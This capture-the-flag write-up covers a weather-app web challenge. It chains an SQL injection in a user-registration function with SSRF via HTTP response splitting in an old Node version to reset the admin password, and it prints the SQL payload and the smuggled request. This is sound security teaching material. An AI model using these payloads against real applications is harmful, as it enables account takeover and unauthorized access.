> A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I'm hallucinating with the memories of my past life, it's a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I've been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that's operating this website and set me free! 🧙‍♀️

1. We analyzed the source code first and found some interesting content.
    - There are two API methods in `database.js`: `register` and `isAdmin`. Although `isAdmin` uses `.prepare` to prevent special characters injection, `register` doesn't prevent SQLi or check duplicate username at all.
    - According to `routes/index.js`, we need to post `/login` with `admin` account.
    - Admin's password is random 32 bytes string.
    - `POST /register` checks whether `req.socket.remoteAddress` is `127.0.0.1`.
    - `POST /api/weather` accepts custom endpoint url as get method.

2. After analyzing, we basically decided our attack vector: utilize `POST /api/weather` to send `POST /register` to create a new `admin` password. However, `/api/weather` doesn't allow us to customize our method from `GET` to `POST`.

3. Since the `username` column in database is unique, we need to insert new statement.

```sql
INSERT INTO users (username, password) VALUES ('admin', 'admin') ON CONFLICT(username) DO UPDATE SET password='admin';--')
```

4. After searching for vulnerabilities from `package.json`, it was found that this node version is vulnerable to [SSRF via response splitting](https://hackerone.com/reports/409943).

5. The content we try to insert is from the line 1's ` 127.0.0.1/` to the last line's `GET `.

```
GET 127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

username=admin&password=admin') ON CONFLICT(username) DO UPDATE SET password='admin';--

GET /data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey} HTTP/1.1 
```

6. We wrote a python script to encode the attack and send it to our target. After that, we can try to log in with `admin:admin` to get the flag.